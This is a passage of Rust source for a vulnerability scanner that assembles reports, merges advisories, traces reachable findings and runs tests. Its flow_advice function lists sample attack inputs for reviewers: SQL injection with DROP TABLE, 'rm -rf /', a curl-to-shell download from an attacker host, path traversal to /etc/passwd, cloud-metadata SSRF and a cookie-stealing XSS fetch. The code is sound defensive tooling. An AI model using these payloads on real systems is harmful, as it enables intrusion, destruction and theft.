        findings.extend(file_findings);
    }

    // ------------------------------------------------------- dependencies/CVE
    let mut dependencies_checked = 0u32;
    if opts.check_dependencies {
        progress.emit(ScanPhase::ResolvingDependencies, "", true);

        let mut all_deps = Vec::new();
        for c in discovery.candidates.iter().filter(|c| c.is_manifest) {
            if let Ok(content) = std::fs::read_to_string(&c.abs_path) {
                all_deps.extend(deps::parse_manifest(&c.rel_path, &content));
            }
        }
        let all_deps = deps::dedupe(all_deps);
        dependencies_checked = all_deps.len() as u32;

        if !all_deps.is_empty() && !cancel.load(Ordering::Relaxed) {
            progress.emit(ScanPhase::QueryingOsv, "", true);
            let client = OsvClient::new();
            match client.query(&all_deps).await {
                Ok(results) => {
                    engines.push("OSV.dev".to_string());
                    for r in results {
                        for adv in r.advisories {
                            findings.push(advisory_to_finding(&r.dependency, &adv));
                        }
                    }
                }
                Err(e) => warnings.push(format!(
                    "Проверка CVE не выполнена ({e}). Код проанализирован, уязвимости зависимостей — нет."
                )),
            }
        }
    }

    // ------------------------------------------------------- external tools
    if !opts.external_tools.is_empty() && !cancel.load(Ordering::Relaxed) {
        progress.emit(ScanPhase::RunningExternalTools, "", true);

        // Discovery already walked the tree, so reuse it rather than searching
        // the filesystem a second time.
        let cargo_lockfiles: Vec<String> = discovery
            .candidates
            .iter()
            .filter(|c| c.rel_path.eq_ignore_ascii_case("Cargo.lock") || c.rel_path.ends_with("/Cargo.lock"))
            .map(|c| c.rel_path.clone())
            .collect();

        let dockerfiles: Vec<String> = discovery
            .candidates
            .iter()
            .filter(|c| c.language == Language::Dockerfile)
            .map(|c| c.rel_path.clone())
            .collect();

        let npm_lockfiles: Vec<String> = discovery
            .candidates
            .iter()
            .filter(|c| {
                c.rel_path.eq_ignore_ascii_case("package-lock.json")
                    || c.rel_path.ends_with("/package-lock.json")
            })
            .map(|c| c.rel_path.clone())
            .collect();

        let mut ext = external::run_available(
            &root,
            &tool_statuses,
            &opts.external_tools,
            &cargo_lockfiles,
            &dockerfiles,
            &npm_lockfiles,
            &cancel,
        )
        .await;
        findings.append(&mut ext.findings);
        warnings.append(&mut ext.warnings);
        engines.extend(ext.engines);
    }

    // Cancelling now kills the running scanner, which means we get here with a
    // half-run set of engines. Falling through would hand back a report that
    // looks complete — the worst outcome for a security tool — so it has to be
    // reported as cancelled, like every other cancellation point.
    if cancel.load(Ordering::Relaxed) {
        progress.emit(ScanPhase::Cancelled, "", true);
        return Ok(cancelled_report(scan_id, &root, target_label, started_at, started));
    }

    // ------------------------------------------------------------- assemble
    progress.emit(ScanPhase::Finalizing, "", true);

    // Findings from external tools land on files the per-file pass already
    // summarised, so severity rollups must be recomputed from the merged set.
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
    });
    findings.dedup_by(|a, b| a.id == b.id);
    findings = merge_duplicate_advisories(findings);
    findings = merge_duplicate_code_findings(findings);

    mark_reachable_findings(&mut findings);

    // Attribute each finding line to its author via git blame — accountability
    // for the report. Runs after the merges so every surviving finding gets one.
    progress.emit(ScanPhase::Finalizing, "git blame", false);
    blame::annotate(&root, &mut findings);

    // Fingerprint first: suppression and comparison both key off it.
    for f in &mut findings {
        f.fingerprint = baseline::fingerprint(f);
    }

    // Number the combination findings in display order (VS-EXP-COMBO-1, -2, …)
    // so several chains in one scan are distinguishable. Done after fingerprints
    // so the numbering never perturbs suppression identity.
    let mut combo_n = 0u32;
    for f in &mut findings {
        if f.rule_id == "VS-EXP-COMBO" {
            combo_n += 1;
            f.rule_id = format!("VS-EXP-COMBO-{combo_n}");
        }
    }

    let (ignores, ignore_warning) = baseline::load_ignores(&root);
    if let Some(w) = ignore_warning {
        warnings.push(w);
    }

    for f in &mut findings {
        if let Some(s) = baseline::match_suppression(f, &f.fingerprint.clone(), &ignores) {
            f.suppressed = true;
            f.suppression_reason = Some(s.reason.clone());
        }
    }

    let suppressed_count = findings.iter().filter(|f| f.suppressed).count() as u32;

    // Taken from the findings rather than the ignore file: a whole-file rule
    // silences findings whose fingerprints were never written down.
    let suppressed_fps: std::collections::HashSet<String> = findings
        .iter()
        .filter(|f| f.suppressed)
        .map(|f| f.fingerprint.clone())
        .collect();

    // Compare only what the user actually sees; a suppressed finding coming
    // back should not read as new work.
    let active: Vec<(String, &Finding)> = findings
        .iter()
        .filter(|f| !f.suppressed)
        .map(|f| (f.fingerprint.clone(), f))
        .collect();

    let previous = baseline::load_snapshot(&root);
    let (delta, statuses) = baseline::compare(&active, previous.as_ref(), &suppressed_fps);

    let snapshot = baseline::to_snapshot(&target_label, &now_iso(), &active);
    if let Err(e) = baseline::save_snapshot(&root, &snapshot) {
        warnings.push(format!("не удалось сохранить историю сканов: {e}"));
    }

    for f in &mut findings {
        if matches!(
            statuses.get(&f.fingerprint),
            Some(baseline::FindingStatus::New)
        ) {
            f.is_new = true;
        }
    }

    // Counts describe what needs attention, so suppressed findings stay out.
    let mut counts = SeverityCounts::default();
    for f in findings.iter().filter(|f| !f.suppressed) {
        counts.add(f.severity);
    }

    // Record a compact point in the scan-history series so the report can draw
    // the trend over the last several scans. Reachability is already marked, so
    // this is just a tally; a failed write must not sink the scan.
    let reachable = findings
        .iter()
        .filter(|f| {
            !f.suppressed
                && !f.extra.as_ref().map(|e| e.experimental).unwrap_or(false)
                && f.extra.as_ref().map(|e| e.on_data_path).unwrap_or(false)
        })
        .count() as u32;
    let point = baseline::HistoryPoint {
        scanned_at: snapshot.scanned_at.clone(),
        total: counts.total(),
        critical: counts.critical,
        high: counts.high,
        medium: counts.medium,
        low: counts.low,
        info: counts.info,
        reachable,
    };
    if let Err(e) = baseline::append_history(&root, point) {
        warnings.push(format!("не удалось обновить историю трендов: {e}"));
    }

    let mut per_file: std::collections::HashMap<&str, SeverityCounts> = Default::default();
    for f in findings.iter().filter(|f| !f.suppressed) {
        per_file.entry(f.file.as_str()).or_default().add(f.severity);
    }
    for file in &mut files {
        if let Some(c) = per_file.get(file.path.as_str()) {
            file.counts = c.clone();
            file.max_severity = findings
                .iter()
                .filter(|f| f.file == file.path && !f.suppressed)
                .map(|f| f.severity)
                .max();
        }
    }
    files.sort_by(|a, b| {
        b.max_severity
            .cmp(&a.max_severity)
            .then_with(|| b.counts.total().cmp(&a.counts.total()))
            .then_with(|| a.path.cmp(&b.path))
    });

    let mut languages: Vec<LanguageStat> = lang_files
        .into_iter()
        .map(|(language, (files, lines))| LanguageStat {
            language,
            label: language.label().to_string(),
            files,
            lines,
        })
        .collect();
    languages.sort_by_key(|l| std::cmp::Reverse(l.files));

    let report = ScanReport {
        id: scan_id,
        root: root.to_string_lossy().to_string(),
        target_label,
        started_at,
        finished_at: now_iso(),
        duration_ms: started.elapsed().as_millis() as u64,
        cancelled: false,
        delta,
        suppressed_count,
        files_scanned: files.len() as u32,
        files_skipped: discovery.skipped.len() as u32,
        lines_scanned: lines_total.load(Ordering::Relaxed),
        bytes_scanned: bytes_total.load(Ordering::Relaxed),
        counts,
        findings,
        files,
        skipped: discovery.skipped,
        languages,
        dependencies_checked,
        engines_used: engines,
        warnings,
    };

    // The report is usable and points at the clone, so it must outlive this
    // call. A cancelled run keeps the guard armed: its report has no files.
    cleanup.disarm();

    progress.emit(ScanPhase::Done, "", true);
    Ok(report)
}

/// Marks every code finding that sits on a data-flow path the taint engine
/// traced from untrusted input, by cross-referencing each finding's location
/// against the steps of the `VS-FLOW` findings.
///
/// This is the bridge between the two engines: a pattern rule says "this call is
/// dangerous", the taint engine says "and untrusted data actually reaches it".
/// A finding true on both counts is reachable — the report's highest-signal
/// class, and what the security score weights most.
fn mark_reachable_findings(findings: &mut [Finding]) {
    use std::collections::HashSet;
    // Every (file, line) covered by a traced flow. A step in another file carries
    // that file; otherwise it is the flow finding's own file.
    let mut on_path: HashSet<(String, u32)> = HashSet::new();
    for f in findings.iter() {
        if f.rule_id != "VS-FLOW" {
            continue;
        }
        if let Some(extra) = &f.extra {
            for step in &extra.flow {
                let file = step.file.clone().unwrap_or_else(|| f.file.clone());
                on_path.insert((file, step.line));
            }
        }
    }
    if on_path.is_empty() {
        return;
    }
    for f in findings.iter_mut() {
        // The data-flow findings themselves are the path, not a separate signal.
        if f.rule_id == "VS-FLOW" || f.rule_id == "VS-LEAK" || f.line == 0 {
            continue;
        }
        if on_path.contains(&(f.file.clone(), f.line)) {
            f.extra.get_or_insert_with(FindingExtra::default).on_data_path = true;
        }
    }
}

/// Concrete exploitation, impact and a fix for a traced data-flow finding,
/// keyed by the sink category. A pattern rule can only speak in generalities;
/// a flow finding knows the exact category it reached, so it can hand the
/// reviewer a copy-paste attack input, the consequences, and how to break it.
/// Returns (exploit, impact bullets, fix snippet). Russian text goes through the
/// UI's `t()`; the fix is code, shown as-is.
fn flow_advice(category: &str) -> (Option<String>, Vec<String>, Option<String>) {
    let (exploit, impact, fix): (&str, &[&str], &str) = match category {
        "SQL-инъекция" => (
            "Ввод «' OR '1'='1' -- » превращает условие в всегда-истинное и выдаёт все строки; «'; DROP TABLE users; --» разрушает данные.",
            &["Чтение любых данных из базы", "Изменение или удаление данных", "Обход аутентификации"],
            "cursor.execute(\"SELECT * FROM users WHERE name = ?\", (name,))  # parameterized, no string building",
        ),
        "Инъекция команд" => (
            "Ввод «; rm -rf / » или «$(curl attacker/x|sh)» выполняет произвольные команды ОС.",
            &["Выполнение произвольных команд на сервере", "Полная компрометация хоста"],
            "subprocess.run([\"ls\", user_dir], shell=False)  # argv array, never a shell string",
        ),
        "Path traversal" => (
            "Ввод «../../../../etc/passwd» выходит за пределы каталога и читает системные файлы.",
            &["Чтение произвольных файлов", "Раскрытие конфигов, ключей и исходников"],
            "p = os.path.realpath(os.path.join(base, name))\nassert p.startswith(base + os.sep)  # stay inside base",
        ),
        "SSRF" => (
            "Ввод «http://169.254.169.254/latest/meta-data/» заставляет сервер обратиться к метаданным облака.",
            &["Доступ к внутренним сервисам", "Кража облачных учётных данных", "Обход сетевого периметра"],
            "host = urlparse(url).hostname\nassert host in ALLOWED_HOSTS  # allowlist; block private ranges",
        ),
        "Выполнение кода" => (
            "Ввод «__import__('os').system('id')» исполняется как код приложения.",
            &["Выполнение произвольного кода", "Полная компрометация приложения"],
            "data = json.loads(text)  # a safe parser instead of eval/exec/pickle",
        ),
        "NoSQL-инъекция" => (
            "Ввод «{\"$gt\": \"\"}» в фильтр или JS в $where («'; return true; //») обходит проверку и выдаёт чужие записи.",
            &["Обход аутентификации и фильтров запроса", "Чтение чужих данных", "Выполнение JS на сервере БД ($where)"],
            "db.users.find({ name: { $eq: String(req.query.name) } })  // fixed operator, coerced type; never $where with input",
        ),
        "XSS" => (
            "Ввод «<script>fetch('//attacker/'+document.cookie)</script>» крадёт cookie в браузере жертвы.",
            &["Кража сессий и токенов", "Действия от имени пользователя", "Подмена содержимого страницы"],
            "el.textContent = value;  // set text, not innerHTML; or escape before inserting HTML",
        ),
        "Открытый редирект" => (
            "Ввод «https://evil.example» уводит пользователя на сайт злоумышленника для фишинга.",
            &["Фишинг с доверенного домена", "Угон OAuth-редиректов"],
            "if not is_relative(dest): dest = \"/\"  # allow only relative paths, or match host to an allowlist",
        ),
        "Утечка чувствительных данных" => (
            "Значение секрета в логе или ответе видит каждый, у кого есть доступ к журналам, их системе сбора или к трафику.",
            &["Раскрытие паролей, токенов и ключей", "Утечка в хранилища логов и третьим лицам"],
            "logger.info(\"user %s authenticated\", user.name)  # log an identifier, never the secret",
        ),
        _ => ("", &[], ""),
    };
    (
        (!exploit.is_empty()).then(|| exploit.to_string()),
        impact.iter().map(|s| s.to_string()).collect(),
        (!fix.is_empty()).then(|| fix.to_string()),
    )
}

/// Identifiers that name the same underlying vulnerability: the advisory's own
/// id plus every CVE/GHSA alias it carries.
fn advisory_identity(f: &Finding) -> Vec<String> {
    let mut ids: Vec<String> = f.cve.clone();
    ids.push(f.rule_id.clone());
    ids.iter_mut().for_each(|s| *s = s.to_ascii_uppercase());
    ids.sort();
    ids.dedup();
    ids
}

/// OSV and cargo-audit both cover crates.io, so a single vulnerable crate is
/// reported twice — once as GHSA-x, once as RUSTSEC-y — even though they are the
/// same advisory. Reporting both inflates the count and makes the user chase a
/// fix they already have. Collapse entries that name the same package version
/// and share any identifier, keeping the richest one.
fn merge_duplicate_advisories(findings: Vec<Finding>) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::with_capacity(findings.len());

    for f in findings {
        // Only dependency findings can collide this way.
        let Some(pkg) = f.package.clone() else {
            out.push(f);
            continue;
        };

        let ids = advisory_identity(&f);
        let existing = out.iter_mut().find(|o| {
            o.package
                .as_ref()
                .map(|p| p.name == pkg.name && p.version == pkg.version)
                .unwrap_or(false)
                && advisory_identity(o).iter().any(|i| ids.contains(i))
        });

        match existing {
            Some(keep) => {
                // Union the identifiers so the surviving entry names every id the
                // user might search for.
                for c in f.cve {
                    if !keep.cve.contains(&c) {
                        keep.cve.push(c);
                    }
                }
                keep.cve.sort();
                for r in f.references {
                    if !keep.references.contains(&r) {
                        keep.references.push(r);
                    }
                }
                for c in f.cwe {
                    if !keep.cwe.contains(&c) {
                        keep.cwe.push(c);
                    }
                }
                // Keep the worst severity: a source that scored it higher may
                // know something the other did not.
                if f.severity > keep.severity {
                    keep.severity = f.severity;
                }
                // Prefer a concrete fixed version over none.
                if let (Some(kp), Some(fp)) = (keep.package.as_mut(), pkg.fixed_version.clone()) {
                    if kp.fixed_version.is_none() {
                        kp.fixed_version = Some(fp);
                        keep.recommendation = f.recommendation;
                    }
                }
            }
            None => out.push(f),
        }
    }

    out
}

/// Collapses code findings that several engines reported for the *same issue* —
/// same file, same line, and a shared CWE. Different tools (and the built-in
/// rules) routinely flag one line each, so without this the report shows the
/// same command injection three times. The survivor keeps the richest detail
/// and lists every engine that agreed, which is a stronger signal than three
/// separate rows.
fn merge_duplicate_code_findings(findings: Vec<Finding>) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::with_capacity(findings.len());
    for f in findings {
        let experimental = f.extra.as_ref().map(|e| e.experimental).unwrap_or(false);
        let has_flow = f.extra.as_ref().map(|e| !e.flow.is_empty()).unwrap_or(false);
        // Only line-anchored code findings with a CWE participate. Dependency
        // findings (dedup'd by advisory), secrets, BETA heuristics, and data-flow
        // findings (whose value is the traced chain) are left exactly as they are.
        if f.package.is_some() || f.line == 0 || f.cwe.is_empty() || experimental || has_flow {
            out.push(f);
            continue;
        }

        let dup = out.iter_mut().find(|o| {
            o.package.is_none()
                && o.line == f.line
                && o.file == f.file
                && !o.extra.as_ref().map(|e| e.experimental).unwrap_or(false)
                && o.cwe.iter().any(|c| f.cwe.contains(c))
        });

        match dup {
            Some(keep) => {
                // Name every engine that agreed. Built-in detail (exploit,
                // impact, fix code) already lives on `keep` when it came first;
                // if the built-in one arrives second, adopt its richer body.
                if f.source == FindingSource::Builtin && keep.source != FindingSource::Builtin {
                    keep.description = f.description.clone();
                    keep.recommendation = f.recommendation.clone();
                    if f.extra.is_some() {
                        keep.extra = f.extra.clone();
                    }
                }
                let label = f.source_label.clone();
                if !keep.source_label.split(" + ").any(|p| p == label) {
                    keep.source_label = format!("{} + {}", keep.source_label, label);
                }
                for c in f.cwe {
                    if !keep.cwe.contains(&c) {
                        keep.cwe.push(c);
                    }
                }
                for r in f.references {
                    if !keep.references.contains(&r) {
                        keep.references.push(r);
                    }
                }
                if f.severity > keep.severity {
                    keep.severity = f.severity;
                }
                let rank = |c: Confidence| match c {
                    Confidence::High => 2u8,
                    Confidence::Medium => 1,
                    Confidence::Low => 0,
                };
                if rank(f.confidence) > rank(keep.confidence) {
                    keep.confidence = f.confidence;
                }
            }
            None => out.push(f),
        }
    }
    out
}

fn advisory_to_finding(dep: &deps::Dependency, adv: &crate::osv::Advisory) -> Finding {
    let cve = adv.cve_ids();
    let display_id = cve.first().cloned().unwrap_or_else(|| adv.id.clone());

    let recommendation = match &adv.fixed_version {
        Some(fixed) => format!(
            "Обновите {} с {} до {} или новее.",
            dep.name, dep.version, fixed
        ),
        None => format!(
            "Исправленной версии пока нет. Проверьте описание {} и рассмотрите замену пакета или временные меры.",
            adv.id
        ),
    };

    let summary = if adv.summary.is_empty() {
        adv.id.clone()
    } else {
        adv.summary.clone()
    };

    Finding {
        id: format!("osv:{}:{}:{}", dep.name, dep.version, adv.id),
        fingerprint: String::new(),
        suppressed: false,
        suppression_reason: None,
        is_new: false,
        rule_id: adv.id.clone(),
        title: format!("{} {} — {}", dep.name, dep.version, display_id),
        description: format!(
            "{}\n\n{}",
            summary,
            adv.details.chars().take(800).collect::<String>()
        )
        .trim()
        .to_string(),
        recommendation,
        severity: adv.severity,
        confidence: Confidence::High,
        source: FindingSource::Osv,
        source_label: FindingSource::Osv.label().to_string(),
        category: "Уязвимая зависимость".to_string(),
        file: dep.manifest.clone(),
        line: dep.line,
        end_line: dep.line,
        column: 0,
        end_column: 0,
        snippet: format!("{} {}", dep.name, dep.version),
        snippet_start_line: dep.line,
        cwe: adv.cwe.clone(),
        owasp: Some("A06:2021 – Vulnerable and Outdated Components".to_string()),
        cve,
        references: adv.references.clone(),
        extra: None,
        package: Some(PackageInfo {
            name: dep.name.clone(),
            version: dep.version.clone(),
            ecosystem: dep.ecosystem.clone(),
            fixed_version: adv.fixed_version.clone(),
        }),
    }
}

fn cancelled_report(
    scan_id: String,
    root: &Path,
    target_label: String,
    started_at: String,
    started: Instant,
) -> ScanReport {
    ScanReport {
        id: scan_id,
        root: root.to_string_lossy().to_string(),
        target_label,
        started_at,
        finished_at: now_iso(),
        duration_ms: started.elapsed().as_millis() as u64,
        cancelled: true,
        delta: Default::default(),
        suppressed_count: 0,
        findings: Vec::new(),
        files: Vec::new(),
        skipped: Vec::new(),
        counts: SeverityCounts::default(),
        files_scanned: 0,
        files_skipped: 0,
        lines_scanned: 0,
        bytes_scanned: 0,
        languages: Vec::new(),
        dependencies_checked: 0,
        engines_used: Vec::new(),
        warnings: vec!["Сканирование отменено пользователем.".to_string()],
    }
}

/// Removes a cloned repository if the scan does not reach a usable report.
///
/// On success the clone must stay: the report points at it and the code viewer
/// reads source from disk. `disarm` is called once a report exists; the clone is
/// then reclaimed by `purge_other_clones` at the start of the next repo scan.
struct CloneGuard(Option<PathBuf>);

impl CloneGuard {
    fn disarm(&mut self) {
        self.0 = None;
    }
}

impl Drop for CloneGuard {
    fn drop(&mut self) {
        if let Some(p) = &self.0 {
            git::cleanup_clone(p);
        }
    }
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolsInfo {
    pub tools: Vec<ToolStatus>,
    pub git_available: bool,
}

pub async fn tools_info() -> ToolsInfo {
    ToolsInfo {
        tools: external::detect_tools().await,
        git_available: git::git_available(),
    }
}

/// Emits a terminal `Failed` progress event after a scan errors out.
pub fn emit_failed(app: &AppHandle, scan_id: &str) {
    let _ = app.emit(
        "scan-progress",
        ScanProgress {
            scan_id: scan_id.to_string(),
            phase: ScanPhase::Failed,
            phase_label: ScanPhase::Failed.label().to_string(),
            current_file: String::new(),
            processed: 0,
            total: 0,
            findings_so_far: 0,
            severe_so_far: 0,
            elapsed_ms: 0,
            eta_ms: None,
            files_per_sec: 0.0,
        },
    );
}

/// Shared cancel flag for the scan currently in flight.
pub struct ScanState {
    pub cancel: Arc<AtomicBool>,
}

impl Default for ScanState {
    fn default() -> Self {
        ScanState {
            cancel: Arc::new(AtomicBool::new(false)),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn line_index_locates_offsets() {
        let content = "alpha\nbeta\ngamma\n";
        let idx = LineIndex::new(content);
        assert_eq!(idx.locate(0), (1, 1));
        assert_eq!(idx.locate(6), (2, 1));
        assert_eq!(idx.locate(8), (2, 3));
        assert_eq!(idx.locate(11), (3, 1));
    }

    #[test]
    fn line_index_counts_and_reads_lines() {
        let idx = LineIndex::new("a\nbb\nccc");
        assert_eq!(idx.line_text(1), "a");
        assert_eq!(idx.line_text(2), "bb");
        assert_eq!(idx.line_text(3), "ccc");
        assert_eq!(idx.line_text(99), "");
    }

    #[test]
    fn line_index_handles_crlf() {
        let idx = LineIndex::new("a\r\nb\r\n");
        assert_eq!(idx.line_text(1), "a");
        assert_eq!(idx.line_text(2), "b");
    }

    #[test]
    fn line_index_handles_empty_content() {
        let idx = LineIndex::new("");
        assert_eq!(idx.locate(0), (1, 1));
        assert_eq!(idx.line_count(), 1);
    }

    #[test]
    fn snippet_includes_context_and_clamps_at_file_start() {
        let content = "l1\nl2\nl3\nl4\nl5\nl6\nl7\nl8\n";
        let idx = LineIndex::new(content);

        let (text, first) = idx.snippet(5);
        assert_eq!(first, 2);
        assert_eq!(text, "l2\nl3\nl4\nl5\nl6\nl7\nl8");

        // Near the top the window must not underflow past line 1.
        let (text, first) = idx.snippet(1);
        assert_eq!(first, 1);
        assert!(text.starts_with("l1"));
    }

    #[test]
    fn redacted_line_replaces_only_the_secret() {
        let content = "DATABASE_URL = \"postgres://admin:hunter2pass@db:5432/prod\"\n";
        let idx = LineIndex::new(content);
        let start = content.find("hunter2pass").unwrap();
        let out = idx.redacted_line(1, start, start + "hunter2pass".len(), "hunt****ss");

        assert!(!out.contains("hunter2pass"), "secret survived redaction: {out}");
        assert!(out.contains("hunt****ss"));
        // The surrounding code must stay readable, or the finding is useless.
        assert!(out.contains("DATABASE_URL"));
        assert!(out.contains("db:5432/prod"));
    }

    #[test]
    fn redaction_falls_back_to_full_mask_on_bad_offsets() {
        let idx = LineIndex::new("key = \"abc\"\n");
        // Offsets pointing outside the line must never yield the raw line.
        assert_eq!(idx.redacted_line(1, 9999, 10001, "****"), "****");
        assert_eq!(idx.redacted_line(1, 5, 2, "****"), "****");
    }

    /// The whole point of masking: a scan report must be shareable. This walks
    /// the real pipeline, because the bug it guards against was a snippet that
    /// appended the mask to an untouched line.
    #[test]
    fn secret_values_never_reach_the_finding() {
        let dir = std::env::temp_dir().join("vulnscope-test-secret-leak");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();

        let password = "kJ8m2NpQ4rT";
        let token = "ghp_kJ8m2NpQ4rT7sV1wXy3zAb6cDe9fGh0iJk2L";
        let path = dir.join("config.py");
        std::fs::write(
            &path,
            format!(
                "DATABASE_URL = \"postgresql://admin:{password}@db.internal:5432/prod\"\n\
                 GITHUB_TOKEN = \"{token}\"\n"
            ),
        )
        .unwrap();

        let (findings, _, _) = scan_one_file(&path, "config.py", Language::Python, true, false, false, &[], 200, &Default::default()).unwrap();
        let secret_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.source == FindingSource::Secrets)
            .collect();
        assert!(!secret_findings.is_empty(), "no secrets detected at all");

        for f in &secret_findings {
            let blob = format!(
                "{} {} {} {}",
                f.snippet, f.title, f.description, f.recommendation
            );
            assert!(
                !blob.contains(password),
                "raw password leaked into finding {}: {}",
                f.rule_id,
                f.snippet
            );
            assert!(
                !blob.contains(token),
                "raw token leaked into finding {}: {}",
                f.rule_id,
                f.snippet
            );
            assert!(f.snippet.contains('*'), "snippet shows no mask: {}", f.snippet);
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn advisory_becomes_finding_with_cve_and_fix() {
        let dep = deps::Dependency {
            name: "lodash".into(),
            version: "4.17.20".into(),
            ecosystem: "npm".into(),
            manifest: "package.json".into(),
            line: 5,
            direct: true,
        };
        let adv = crate::osv::Advisory {
            id: "GHSA-35jh-r3h4-6jhm".into(),
            summary: "Command Injection in lodash".into(),
            details: "details".into(),
            aliases: vec!["CVE-2021-23337".into()],
            severity: Severity::High,
            cvss_score: Some(7.2),
            cvss_vector: None,
            cwe: vec!["CWE-77".into()],
            references: vec![],
            fixed_version: Some("4.17.21".into()),
            published: None,
        };

        let f = advisory_to_finding(&dep, &adv);
        assert!(f.title.contains("CVE-2021-23337"));
        assert!(f.recommendation.contains("4.17.21"));
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.file, "package.json");
        assert_eq!(f.line, 5);
        let pkg = f.package.unwrap();
        assert_eq!(pkg.fixed_version.as_deref(), Some("4.17.21"));
    }

    #[test]
    fn advisory_without_fix_says_so() {
        let dep = deps::Dependency {
            name: "x".into(),
            version: "1.0.0".into(),
            ecosystem: "npm".into(),
            manifest: "package.json".into(),
            line: 0,
            direct: true,
        };
        let adv = crate::osv::Advisory {
            id: "GHSA-yyyy".into(),
            summary: "s".into(),
            details: String::new(),
            aliases: vec![],
            severity: Severity::Medium,
            cvss_score: None,
            cvss_vector: None,
            cwe: vec![],
            references: vec![],
            fixed_version: None,
            published: None,
        };
        let f = advisory_to_finding(&dep, &adv);
        assert!(f.recommendation.contains("Исправленной версии пока нет"));
        // With no CVE alias, the advisory id is what the user sees.
        assert!(f.title.contains("GHSA-yyyy"));
    }

    /// Builds a throwaway project on disk so discovery, binary filtering and the
    /// rule pass are exercised against real files rather than in-memory strings.
    fn make_fixture(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("vulnscope-test-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::create_dir_all(dir.join("node_modules/lodash")).unwrap();

        std::fs::write(
            dir.join("src/app.py"),
            "import subprocess\n\
             def run(cmd):\n\
             \x20   subprocess.run(cmd, shell=True)\n\
             def q(conn, uid):\n\
             \x20   conn.execute(f\"SELECT * FROM users WHERE id = {uid}\")\n",
        )
        .unwrap();

        std::fs::write(
            dir.join("src/safe.py"),
            "def add(a, b):\n    return a + b\n",
        )
        .unwrap();

        std::fs::write(
            dir.join("package.json"),
            r#"{"dependencies":{"lodash":"4.17.20"}}"#,
        )
        .unwrap();

        // A real binary: must be skipped, never regex-scanned.
        std::fs::write(dir.join("tool.exe"), b"MZ\x90\x00\x03\x00\x00\x00\x04\x00").unwrap();
        // Text extension but binary content: only the sniffer catches this.
        std::fs::write(dir.join("src/data.txt"), b"abc\x00\x01\x02def").unwrap();
        // Third-party code: pruned by default.
        std::fs::write(
            dir.join("node_modules/lodash/index.js"),
            "eval(userInput);\n",
        )
        .unwrap();

        dir
    }

    #[test]
    fn end_to_end_discovery_and_scan_on_real_files() {
        let dir = make_fixture("e2e");
        let discovery = walk::discover(&dir, &WalkOptions::default());

        let scanned: Vec<&str> = discovery
            .candidates
            .iter()
            .map(|c| c.rel_path.as_str())
            .collect();

        assert!(scanned.contains(&"src/app.py"));
        assert!(scanned.contains(&"package.json"));
        // The .exe and the NUL-containing .txt must not reach the rule engine.
        assert!(!scanned.contains(&"tool.exe"));
        assert!(!scanned.contains(&"src/data.txt"));
        // node_modules is pruned unless the user opts in.
        assert!(!scanned.iter().any(|p| p.contains("node_modules")));

        let skipped: Vec<(&str, SkipReason)> = discovery
            .skipped
            .iter()
            .map(|s| (s.path.as_str(), s.reason))
            .collect();
        assert!(skipped.contains(&("tool.exe", SkipReason::BinaryExtension)));
        assert!(skipped.contains(&("src/data.txt", SkipReason::BinaryContent)));

        // Every skip carries a human-readable reason for the UI.
        assert!(discovery.skipped.iter().all(|s| !s.reason_label.is_empty()));

        let app = discovery
            .candidates
            .iter()
            .find(|c| c.rel_path == "src/app.py")
            .unwrap();
        let (findings, lines, size) = scan_one_file(&app.abs_path, &app.rel_path, app.language, true, false, false, &[], 200, &Default::default()).unwrap();

        assert!(lines >= 5);
        assert!(size > 0);
        let ids: Vec<&str> = findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"VS-PY-003"), "shell=True not found: {ids:?}");
        assert!(ids.contains(&"VS-PY-008"), "SQL f-string not found: {ids:?}");

        // Findings must point at real lines and carry a snippet.
        for f in &findings {
            assert!(f.line >= 1 && f.line <= lines, "line {} out of range", f.line);
            assert!(!f.snippet.is_empty());
            assert!(!f.recommendation.is_empty());
        }

        let safe = discovery
            .candidates
            .iter()
            .find(|c| c.rel_path == "src/safe.py")
            .unwrap();
        let (clean, _, _) = scan_one_file(&safe.abs_path, &safe.rel_path, safe.language, true, false, false, &[], 200, &Default::default()).unwrap();
        assert!(clean.is_empty(), "clean file produced findings: {clean:?}");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn vendor_directories_are_scanned_when_requested() {
        let dir = make_fixture("vendor");
        let opts = WalkOptions {
            include_vendor: true,
            ..Default::default()
        };
        let discovery = walk::discover(&dir, &opts);
        assert!(discovery
            .candidates
            .iter()
            .any(|c| c.rel_path.contains("node_modules")));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn manifests_are_discovered_and_parsed() {
        let dir = make_fixture("manifest");
        let discovery = walk::discover(&dir, &WalkOptions::default());
        let manifest = discovery
            .candidates
            .iter()
            .find(|c| c.is_manifest)
            .expect("package.json should be flagged as a manifest");

        let content = std::fs::read_to_string(&manifest.abs_path).unwrap();
        let parsed = deps::parse_manifest(&manifest.rel_path, &content);
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].name, "lodash");
        assert_eq!(parsed[0].version, "4.17.20");
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn dep_finding(
        rule_id: &str,
        cve: &[&str],
        pkg: &str,
        ver: &str,
        sev: Severity,
        source: FindingSource,
        fixed: Option<&str>,
    ) -> Finding {
        Finding {
            id: format!("{source:?}:{rule_id}"),
            fingerprint: String::new(),
            suppressed: false,
            suppression_reason: None,
            is_new: false,
            rule_id: rule_id.into(),
            title: format!("{pkg} {ver}"),
            description: String::new(),
            recommendation: format!("Обновите {pkg} до {}", fixed.unwrap_or("—")),
            severity: sev,
            confidence: Confidence::High,
            source,
            source_label: source.label().into(),
            category: "Уязвимая зависимость".into(),
            file: "Cargo.lock".into(),
            line: 0,
            end_line: 0,
            column: 0,
            end_column: 0,
            snippet: String::new(),
